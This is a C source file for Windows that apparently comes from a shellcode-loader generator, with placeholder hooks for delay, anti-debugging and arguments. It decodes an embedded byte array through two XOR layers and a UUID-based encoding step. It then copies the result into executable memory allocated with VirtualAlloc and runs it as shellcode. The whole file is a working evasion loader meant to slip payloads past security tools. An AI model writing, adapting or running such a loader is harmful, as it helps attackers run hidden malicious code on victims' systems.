#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <rpc.h>


//####DEFINE####

int xor_encode_f172fd82fbaf4728b9bee53e95a2b565(unsigned char* data, int data_len)
{
    const char* key = "0jJ(oHvX06ul";
    int key_len = 12;
    
    printf("\n[*] Before XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }


    printf("\n[*] After XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    return data_len;
}
int uuid_decode_98b7e006ba1b4ed5856680e109d07bbe(unsigned char* encoded, int length)
{

    size_t uuid_length = 36;
    //size_t uuid_count = ((length + uuid_length - 1) / uuid_length); // Calcul du nombre de uuids
    
    // Define uuid_count dynamicly depending if encoded is a string or hex (looking for printable char)
    size_t uuid_count = 0;
    for (int i = 0; i < length; ++i) {
        if (!(encoded[i] >=32 && encoded[i] <=126)) {
            uuid_count = ((length + uuid_length - 1) / uuid_length) - 1;
            break;
        }else{
            uuid_count = ((length + uuid_length - 1) / uuid_length);
        }
    }
    
    printf("\n[*] Before UUID values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }

    printf("}\n");
    // Allouer de la mémoire pour le tableau de uuids
    char** uuids = (char**)malloc(uuid_count * sizeof(char*));
    if (uuids == NULL) {
        perror("Failed to allocate memory");
        exit(EXIT_FAILURE);
    }

    // Découper la chaîne en uuids
    for (size_t i = 0; i < uuid_count; ++i) {
        // Allouer de la mémoire pour chaque segment (uuid_length + 1 pour le caractère NULL)
        uuids[i] = (char*)malloc(uuid_length + 1);
        if (uuids[i] == NULL) {
            perror("Failed to allocate memory");
            exit(EXIT_FAILURE);
        }

        // Copier la partie de la chaîne dans le segment
        size_t start_index = i * uuid_length;
        size_t length_to_copy = (length - start_index < uuid_length) ? (length - start_index) : uuid_length;
        strncpy(uuids[i], (const char*)(encoded + start_index), length_to_copy);
        uuids[i][length_to_copy] = '\0'; // Ajouter le caractère NULL de fin

    }

    //Afficher les UUID
    //printf("\n[*] Before UUID values (Str): {");
    //for (size_t i = 0; i < uuid_count; i++) {
    //    printf("%s\n", uuids[i]);
    //}

    // Allocate memory for the binary UUIDs
    unsigned char* binary_uuids = (unsigned char*)malloc(uuid_count * sizeof(UUID));
    if (binary_uuids == NULL) {
        perror("Failed to allocate memory");
        exit(EXIT_FAILURE);
    }

    // Convert the UUID strings to binary format and store them in the binary_uuids buffer
    for (size_t i = 0; i < uuid_count; ++i) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)(binary_uuids + i * sizeof(UUID)));
        if (status != RPC_S_OK) {
            printf("UuidFromStringA n°%d failed with status %d\n", i,status);
            free(binary_uuids);
            for (size_t j = 0; j < uuid_count; ++j) {
                free(uuids[j]);
            }
            free(uuids);
            exit(EXIT_FAILURE);
        }
    }
    // Copy the binary UUID data back to the encoded buffer
    memcpy(encoded, binary_uuids, uuid_count * sizeof(UUID));

    // Print the hex dump of the encoded buffer
    printf("\n[*] After UUID values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    // Free the UUID string segments
    for (size_t i = 0; i < uuid_count; ++i) {
        free(uuids[i]);
    }
    free(uuids); // Free the array of UUID strings

    // Free the binary UUIDs buffer
    free(binary_uuids);

    return uuid_count * (sizeof(UUID) + 1); // Return the number of UUIDs as char (adjust the return type as needed)
}
int xor_encode_f0bbc8c5ee2b4fb29dc157588c699583(unsigned char* data, int data_len)
{
    const char* key = "8=v.Soun(jW8";
    int key_len = 12;
    
    printf("\n[*] Before XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }


    printf("\n[*] After XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    return data_len;
}



DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0x53,0x0b,0x2c,0x1d,0x58,0x7d,0x15,0x6c,0x1d,0x0e,0x42,0x0d,0x03,0x47,0x7c,0x4d,0x0d,0x7d,0x5b,0x6a,0x08,0x00,0x14,0x41,0x01,0x5c,0x7c,0x11,0x58,0x71,0x40,0x3c,0x02,0x02,0x42,0x0a,0x52,0x09,0x7e,0x1c,0x5d,0x7f,0x46,0x6d,0x1d,0x04,0x47,0x58,0x54,0x47,0x7c,0x49,0x0b,0x2b,0x5b,0x6d,0x08,0x01,0x40,0x41,0x56,0x0e,0x7d,0x4b,0x5b,0x2a,0x44,0x6f,0x56,0x53,0x46,0x0f,0x04,0x0b,0x2e,0x4b,0x5d,0x7a,0x46,0x60,0x1d,0x01,0x40,0x5a,0x08,0x47,0x73,0x11,0x58,0x71,0x5b,0x69,0x09,0x04,0x40,0x41,0x03,0x52,0x7f,0x4e,0x0a,0x79,0x44,0x6a,0x06,0x00,0x13,0x54,0x05,0x58,0x7b,0x1f,0x5f,0x79,0x4f,0x6c,0x1d,0x02,0x46,0x59,0x01,0x47,0x78,0x4e,0x5a,0x7d,0x5b,0x3d,0x09,0x57,0x46,0x41,0x05,0x0b,0x7d,0x11,0x5c,0x71,0x10,0x3b,0x09,0x02,0x16,0x5f,0x02,0x5c,0x78,0x1c,0x5d,0x2d,0x46,0x69,0x1d,0x05,0x4d,0x0d,0x03,0x47,0x28,0x1b,0x58,0x7f,0x5b,0x6f,0x51,0x06,0x44,0x41,0x03,0x0f,0x78,0x4e,0x57,0x7b,0x13,0x6c,0x56,0x03,0x10,0x5a,0x07,0x5a,0x7f,0x1f,0x59,0x29,0x44,0x60,0x1d,0x50,0x11,0x0e,0x54,0x47,0x7e,0x11,0x5f,0x7a,0x5b,0x69,0x52,0x00,0x10,0x41,0x51,0x5f,0x79,0x4d,0x0e,0x7b,0x44,0x6a,0x04,0x50,0x42,0x0f,0x06,0x5d,0x7f,0x1e,0x58,0x2c,0x14,0x6b,0x1d,0x54,0x13,0x59,0x02,0x47,0x79,0x10,0x56,0x7e,0x5b,0x6e,0x00,0x0f,0x40,0x41,0x09,0x0f,0x7d,0x11,0x0d,0x7b,0x46,0x61,0x56,0x53,0x43,0x5a,0x05,0x0c,0x79,0x10,0x0d,0x71,0x43,0x6a,0x1d,0x04,0x47,0x09,0x01,0x47,0x2c,0x10,0x59,0x7e,0x5b,0x61,0x04,0x01,0x16,0x41,0x52,0x5d,0x2f,0x1f,0x5a,0x2d,0x44,0x3d,0x07,0x02,0x14,0x0a,0x53,0x53,0x78,0x1a,0x57,0x29,0x47,0x68,0x1d,0x05,0x10,0x5b,0x04,0x47,0x7a,0x49,0x5c,0x29,0x5b,0x6d,0x52,0x04,0x14,0x41,0x04,0x09,0x28,0x4e,0x5a,0x2c,0x14,0x6a,0x00,0x50,0x42,0x0f,0x06,0x5d,0x7f,0x1a,0x58,0x2c,0x14,0x6b,0x1d,0x54,0x13,0x59,0x02,0x47,0x78,0x4e,0x5e,0x7b,0x5b,0x39,0x03,0x00,0x43,0x41,0x01,0x0c,0x7d,0x4b,0x0d,0x7b,0x41,0x3c,0x06,0x57,0x43,0x5b,0x55,0x5f,0x79,0x1c,0x0d,0x2e,0x43,0x6a,0x1d,0x53,0x47,0x5e,0x53,0x47,0x79,0x11,0x5e,0x2e,0x5b,0x3d,0x08,0x01,0x16,0x41,0x02,0x0f,0x7c,0x4e,0x5f,0x2a,0x45,0x69,0x02,0x55,0x46,0x58,0x06,0x5b,0x7b,0x1e,0x5c,0x7a,0x40,0x61,0x1d,0x00,0x42,0x5b,0x09,0x47,0x2b,0x4c,0x5c,0x2d,0x5b,0x3a,0x56,0x02,0x13,0x41,0x03,0x5e,0x79,0x4b,0x0b,0x7f,0x4e,0x39,0x00,0x50,0x42,0x55,0x51,0x5f,0x79,0x4d,0x59,0x7f,0x40,0x69,0x1d,0x0e,0x43,0x58,0x01,0x47,0x73,0x19,0x5d,0x7a,0x5b,0x3c,0x07,0x0f,0x40,0x41,0x00,0x0b,0x7d,0x18,0x57,0x7a,0x45,0x3b,0x07,0x00,0x47,0x09,0x06,0x0f,0x7d,0x1d,0x59,0x2e,0x43,0x6b,0x1d,0x04,0x47,0x5e,0x08,0x47,0x28,0x1d,0x0b,0x29,0x5b,0x6b,0x09,0x05,0x16,0x41,0x07,0x5c,0x78,0x4d,0x5e,0x7a,0x12,0x6d,0x04,0x02,0x10,0x59,0x55,0x0e,0x2b,0x10,0x0a,0x2c,0x42,0x6f,0x1d,0x55,0x11,0x54,0x03,0x47,0x72,0x4b,0x0c,0x7b,0x5b,0x68,0x05,0x04,0x10,0x41,0x53,0x0c,0x29,0x10,0x0d,0x2c,0x12,0x6f,0x53,0x57,0x16,0x5b,0x55,0x0b,0x2c,0x1d,0x58,0x7d,0x13,0x3c,0x1d,0x03,0x46,0x5b,0x52,0x47,0x7b,0x1a,0x58,0x7b,0x5b,0x6a,0x02,0x53,0x14,0x41,0x51,0x09,0x2e,0x10,0x5b,0x2c,0x45,0x60,0x53,0x52,0x43,0x55,0x00,0x5e,0x7b,0x49,0x5e,0x2c,0x42,0x68,0x1d,0x05,0x46,0x5e,0x08,0x47,0x28,0x19,0x5e,0x7e,0x5b,0x3d,0x02,0x55,0x47,0x41,0x51,0x59,0x7e,0x4c,0x5c,0x7a,0x46,0x6b,0x01,0x00,0x41,0x5c,0x03,0x52,0x79,0x1a,0x5e,0x7a,0x42,0x3c,0x1d,0x0f,0x45,0x55,0x00,0x47,0x73,0x18,0x56,0x78,0x5b,0x61,0x00,0x0f,0x45,0x41,0x09,0x5a,0x73,0x18,0x56,0x78,0x4f,0x68,0x09,0x06,0x4c,0x5c};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = xor_encode_f172fd82fbaf4728b9bee53e95a2b565(encoded, length);length = uuid_decode_98b7e006ba1b4ed5856680e109d07bbe(encoded, length);length = xor_encode_f0bbc8c5ee2b4fb29dc157588c699583(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
